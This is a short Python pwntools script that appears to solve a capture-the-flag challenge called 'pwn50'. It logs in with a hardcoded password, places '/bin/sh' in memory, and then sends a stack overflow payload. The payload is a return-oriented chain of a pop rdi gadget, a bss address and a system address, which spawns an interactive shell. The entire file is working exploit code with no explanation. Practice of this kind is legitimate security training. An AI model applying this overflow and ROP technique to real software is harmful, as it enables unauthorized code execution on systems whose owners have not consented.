from pwn import *

# context.log_level = 'debug'

p = process('./pwn50')

p.recvuntil('username: ')
p.sendline('admin')
p.recvuntil('password: ')
p.sendline('T6OBSh2i')

p.recvuntil('Your choice: ')
p.sendline('1')
p.recvuntil('Command: ')
p.sendline('/bin/sh')

p.recvuntil('Your choice: ')
bss_addr = 0x0000000000601100
system_addr = 0x000000000040084A
pop_rdi = 0x0000000000400b03
pad = '3'*0x50
payload = pad+p64(0)+p64(pop_rdi)+p64(bss_addr)+p64(system_addr)

p.sendline(payload)

p.interactive()